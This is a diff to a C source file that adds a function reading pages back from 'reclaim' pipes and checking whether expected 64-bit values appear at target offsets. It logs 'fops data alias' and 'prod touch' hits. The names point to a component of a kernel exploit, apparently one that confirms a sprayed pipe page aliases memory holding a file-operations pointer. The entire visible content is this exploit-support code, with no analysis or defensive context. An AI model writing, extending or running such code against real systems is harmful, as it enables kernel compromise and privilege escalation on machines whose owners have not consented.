@@ -1260,6 +1260,109 @@ int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
   }
   return changed_pages == 0 ? 0 : -1;
 }
+
+/* Single-pass multi-word variant. Pair 0 MUST be the fops pair: its log
+ * lines and aggregation are byte-identical to verify_p0_pipe_data_page so
+ * postwrite semantics are preserved. Pairs 1..n-1 are production-touch words
+ * (label != NULL) logged as "bank touch" lines. Pipes are destructive-read,
+ * hence one loop for all pairs. */
+int verify_p0_probe_pairs(struct p0_probe_pair *pairs, size_t n) {
+  unsigned char page[PAGE_SIZE];
+  int changed_pages = 0;
+  size_t k;
+
+  if (!pairs || !n) {
+    return -1;
+  }
+  for (k = 0; k < n; k++) {
+    size_t off = pairs[k].target & (PAGE_SIZE - 1);
+    if (off + sizeof(uint64_t) > sizeof(page)) {
+      return -1;
+    }
+    pairs[k].exact = 0;
+    pairs[k].observed = 0;
+    pairs[k].nearest = -1;
+  }
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
+                        sizeof(page))) {
+      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
+                 pipe_index, errno);
+      return -1;
+    }
+    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+      continue;
+    }
+    changed_pages++;
+    for (k = 0; k < n; k++) {
+      size_t off = pairs[k].target & (PAGE_SIZE - 1);
+      uint64_t w = 0;
+      long nearest_off = -1;
+      long nearest_dist = 0;
+      uint64_t win[4] = {0, 0, 0, 0};
+      size_t base;
+      size_t j;
+      memcpy(&w, page + off, sizeof(w));
+      pairs[k].observed = w;
+      if (w == pairs[k].expected) {
+        pairs[k].exact++;
+      }
+      for (size_t wi = 0; wi + sizeof(uint64_t) <= sizeof(page); wi++) {
+        uint64_t c = 0;
+        long o;
+        long d;
+        memcpy(&c, page + wi, sizeof(c));
+        if (c != pairs[k].expected) {
+          continue;
+        }
+        o = (long)wi;
+        d = o >= (long)off ? o - (long)off : (long)off - o;
+        if (nearest_off == -1 || d < nearest_dist) {
+          nearest_off = o;
+          nearest_dist = d;
+        }
+      }
+      pairs[k].nearest = nearest_off;
+      base = off >= 16 ? off - 16 : 0;
+      for (j = 0; j < 4; j++) {
+        if (base + j * 8 + sizeof(uint64_t) <= sizeof(page)) {
+          memcpy(&win[j], page + base + j * 8, sizeof(win[j]));
+        }
+      }
+      if (k == 0) {
+        pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
+                "observed=%016llx expected=%016llx match=%d nearest=%ld "
+                "win=%016llx:%016llx:%016llx:%016llx\n",
+                pipe_index, pairs[k].target, off,
+                (unsigned long long)w,
+                (unsigned long long)pairs[k].expected, w == pairs[k].expected,
+                nearest_off,
+                (unsigned long long)win[0], (unsigned long long)win[1],
+                (unsigned long long)win[2], (unsigned long long)win[3]);
+      } else {
+        pr_info("prod touch pipe=%zu label=%s target=%016zx offset=%zu "
+                "observed=%016llx expected=%016llx match=%d nearest=%ld "
+                "win=%016llx:%016llx:%016llx:%016llx\n",
+                pipe_index, pairs[k].label ? pairs[k].label : "?",
+                pairs[k].target, off,
+                (unsigned long long)w,
+                (unsigned long long)pairs[k].expected, w == pairs[k].expected,
+                nearest_off,
+                (unsigned long long)win[0], (unsigned long long)win[1],
+                (unsigned long long)win[2], (unsigned long long)win[3]);
+      }
+    }
+  }
+  pr_info("fops data alias changed=%d exact=%d target=%016zx "
+          "observed=%016llx expected=%016llx\n",
+          changed_pages, pairs[0].exact, pairs[0].target,
+          (unsigned long long)pairs[0].observed,
+          (unsigned long long)pairs[0].expected);
+  if (changed_pages == 1 && pairs[0].exact == 1) {
+    return 1;
+  }
+  return changed_pages == 0 ? 0 : -1;
+}
 #endif
 
 static int p0_fingerprint_score(
